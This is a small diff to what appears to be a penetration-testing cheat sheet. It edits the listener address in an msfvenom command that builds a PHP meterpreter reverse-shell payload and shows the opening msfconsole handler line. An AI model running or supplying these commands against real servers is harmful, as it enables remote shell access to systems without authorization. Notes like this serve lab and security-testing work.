@@ -38,7 +38,7 @@
 
 ### msfvenom and msfconsole reverse shell
 
-- `msfvenom -p php/meterpreter_reverse_tcp lhost=10.13.37.10 lport=9998 -o moon.php`
+- `msfvenom -p php/meterpreter_reverse_tcp lhost=10.0.0.1 lport=9998 -o moon.php`
 
 #msfconsole
 - `use exploit/multi/handler`
